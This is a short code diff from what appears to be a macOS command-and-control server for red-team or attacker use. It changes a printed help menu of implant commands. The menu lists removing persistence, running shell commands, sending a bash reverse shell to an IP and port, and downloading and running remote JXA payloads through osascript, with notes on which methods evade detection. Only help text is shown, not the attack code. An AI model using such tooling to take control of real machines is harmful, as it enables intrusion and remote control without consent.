@@ -80,7 +80,7 @@ async def CheckIn(request):
                 print(">\033[1;33munpersist\033[0m: Remove the Login Item persistence. \033[36mMethod: Uses LSSharedFileList API calls via Objective C\033[0m")
                 print(">\033[1;33mshell [shell command]\033[0m: Run a shell command...Method: \033[1;91mNOT OPSEC SAFE, as this uses easily detectable command line strings\033[0m")
                 print(">\033[1;33mspawn [IP]:[port]\033[0m: Send a bash interactive reverse shell to an IP:port (ex: spawnshell 10.10.10.10:443)...Method: \033[1;91mNOT OPSEC SAFE, as this uses easily detectable command line strings\033[0m")
-                print(">\033[1;33mrunjxa [url]\033[0m: Execute the jxa .js code hosted at the supplied url. \033[36mMethod: NSAppleScript API calls via Objective C\033[0m")
+                print(">\033[1;33mrunjxa [url]\033[0m: Execute the jxa .js code hosted at the supplied url. This can be used to execute Mythic JXA payloads. Method: \033[1;91mNOT OPSEC SAFE Uses urllib to download the payload and then the osascript binary to run it.\033[0m")
                 print('')
                 print("--->OTHER<---")
                 print(">\033[1;33mdone\033[0m: Send queued commands to the client for execution")
